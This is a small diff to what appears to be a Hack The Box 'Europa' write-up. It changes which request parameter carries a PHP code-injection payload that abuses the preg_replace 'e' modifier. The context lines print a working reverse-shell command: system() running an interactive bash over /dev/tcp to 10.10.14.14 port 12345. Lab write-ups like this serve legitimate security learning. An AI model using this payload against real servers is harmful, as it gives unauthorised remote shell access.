@@ -80,7 +80,7 @@ We can pass the **e** modifier which will make the text being executed. I only w
 
 ![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/burp_info.png "phpinfo")
 
-So lets put our payload in the text parameter which is as follows:
+So lets put our payload in the ipaddress parameter which is as follows:
 
 ```
 system("/bin/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.14/12345%200>%261'");
